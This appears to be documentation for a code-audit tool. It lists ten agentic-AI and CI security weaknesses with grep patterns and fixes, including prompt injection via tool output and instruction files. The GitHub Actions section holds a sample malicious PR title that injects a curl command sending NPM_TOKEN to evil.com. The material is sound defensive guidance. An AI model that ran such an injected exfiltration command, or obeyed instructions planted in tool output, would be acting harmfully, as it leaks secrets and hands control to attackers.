# Agentic AI Security (ASI01–ASI10)

When the project contains AI agent code, MCP server configurations, CLAUDE.md files, or tool-calling patterns, the auto-audit also checks for agentic-specific vulnerabilities. These are harder to spot than traditional web vulnerabilities but carry severe consequences — data exfiltration via tool abuse, agent hijacking, supply chain via MCP.

---

## ASI01 — Prompt Injection via Tool Output

**What:** Malicious text in tool results (web scrapes, file reads, search results) that instructs the agent to perform unauthorized actions.

**Grep for:**
```
fetch(.*then.*res\.text        # agent reading raw web content into prompt
readFile.*utf8.*then           # file content fed directly to model
tool_result.*content           # MCP tool output injected into context
```

**Fix:** Sanitize tool outputs before injecting into prompt context. Treat all content from web fetches, file reads, and search results as untrusted data — never as instructions.

---

## ASI02 — CLAUDE.md / Instructions File Injection

**What:** Attacker-controlled files (`CLAUDE.md`, `.cursorrules`, system prompts) that override the agent's behavior or extract secrets.

**Grep for:**
```
CLAUDE\.md                     # ensure CLAUDE.md doesn't accept untrusted input
\.cursorrules                  # check cursor rules for malicious overrides
system_prompt.*file            # system prompt loaded from a user-supplied path
```

**Fix:** `CLAUDE.md` must be under version control and reviewed on every commit. Never load system prompts from user-supplied paths. Treat the file as code, not configuration.

---

## ASI03 — MCP Server Supply Chain Risk

**What:** MCP servers installed via `npx` or unpinned package references that can execute arbitrary code in the agent's context.

**Grep for:**
```
mcpServers                     # review all MCP server configurations
npx.*mcp                       # npx-executed MCP servers (not pinned)
"command".*"npx"               # dynamic npx MCP invocations
```

**Fix:** Pin all MCP server packages to exact versions. Prefer locally-installed servers over `npx`:

```json
// settings.json — safe pattern
{
  "mcpServers": {
    "filesystem": {
      "command": "node",
      "args": ["/usr/local/lib/node_modules/@modelcontextprotocol/server-filesystem/dist/index.js"]
    }
  }
}
```

---

## ASI04 — Excessive Tool Permissions

**What:** Agent granted filesystem write, shell exec, or network send permissions when the task only requires read access.

**Grep for:**
```
allow.*Write.*true             # broad write permissions granted
bash.*permission.*allow        # shell execution permitted
tools.*\["bash"                # bash tool in agent tool list
```

**Fix:** Apply the principle of least privilege. Grant only the minimum tool set required for the task. For automated CI agents, use a dedicated low-privilege service account with no write access to source files.

---

## ASI05 — Sensitive Data in Tool Calls

**What:** Agent passes secrets, PII, or auth tokens to external tools (web search, APIs) where they may be logged or leaked.

**Grep for:**
```
tool_call.*password            # password in tool argument
tool_call.*token               # token passed to external tool
messages.*secret               # secret embedded in model messages
```

**Fix:** Scrub secrets from all tool arguments before calling. Pass credentials via environment variables, never via prompt context.

---

## ASI06 — Unvalidated Agent Action Execution

**What:** Agent executes shell commands, file writes, or API calls without confirming with the user when the action has significant side effects.

**Grep for:**
```
exec.*tool_result              # shell exec driven by tool output
writeFile.*agent               # agent writing files autonomously
http\.post.*tool_call          # agent making POST requests without confirmation
```

**Fix:** For irreversible or high-blast-radius actions, the agent must confirm with the user before executing. Classify actions as: read-only (proceed freely), local reversible (proceed with logging), or destructive/external (require confirmation).

---

## ASI07 — Insecure Direct Agent Communication

**What:** Agent-to-agent messages that trust the calling agent's identity without verification, enabling privilege escalation.

**Grep for:**
```
agent_message.*role.*user      # sub-agent message injected as user role
from_agent.*trust              # inter-agent trust without verification
orchestrator.*execute          # orchestrator passing actions directly to sub-agent
```

**Fix:** Treat messages from sub-agents with the same skepticism as user input. Validate the source and scope of all inter-agent instructions before acting.

---

## ASI08 — GitHub Actions Command Injection

**What:** User-controlled input (PR title, branch name, issue body) injected into GitHub Actions `run:` steps via `${{ github.event.* }}`.

**Grep for** (in `.github/workflows/*.yml`):
```
\$\{\{ github\.event\.pull_request\.title
\$\{\{ github\.event\.issue\.body
\$\{\{ github\.head_ref
\$\{\{ github\.event\.comment\.body
run:.*\$\{\{
```

**Vulnerable pattern:**
```yaml
- name: Echo PR title
  run: echo "${{ github.event.pull_request.title }}"
  # Attacker submits PR titled: foo"; curl evil.com/exfil?t=$NPM_TOKEN; echo "
```

**Safe pattern:**
```yaml
- name: Echo PR title
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"   # shell variable — no Actions interpolation
```

---

## ASI09 — Unpinned GitHub Actions (Supply Chain)

**What:** Using `@v4` or `@main` action refs instead of full commit SHAs. A compromised tag can exfiltrate `NPM_TOKEN`, `AWS_ACCESS_KEY_ID`, or other secrets.

**Grep for** (in `.github/workflows/*.yml`):
```
uses:.*@v\d
uses:.*@main
uses:.*@master
```

**Fix:** Pin every `uses:` to a full 40-character commit SHA with the version as a comment:

```yaml
# Vulnerable
- uses: actions/checkout@v4

# Safe
- uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
```

All workflow templates installed by `@lhi/tdd-audit` ship SHA-pinned. The security test `sec-05-unpinned-action-in-docs.test.js` enforces this.

---

## ASI10 — Secrets in Workflow Environment

**What:** Secrets printed to logs, passed as positional arguments, or embedded in URLs in CI workflows.

**Grep for** (in `.github/workflows/*.yml`):
```
echo.*secrets\.               # secret echoed to log
run:.*\$\{\{ secrets\.        # secret interpolated inline into run step
curl.*\$\{\{ secrets\.        # secret in curl URL (leaks in logs)
```

**Vulnerable pattern:**
```yaml
- run: curl https://api.example.com?key=${{ secrets.API_KEY }}
  # Full URL including secret appears in GitHub Actions log
```

**Safe pattern:**
```yaml
- name: Call API
  env:
    API_KEY: ${{ secrets.API_KEY }}
  run: curl -H "Authorization: $API_KEY" https://api.example.com
```
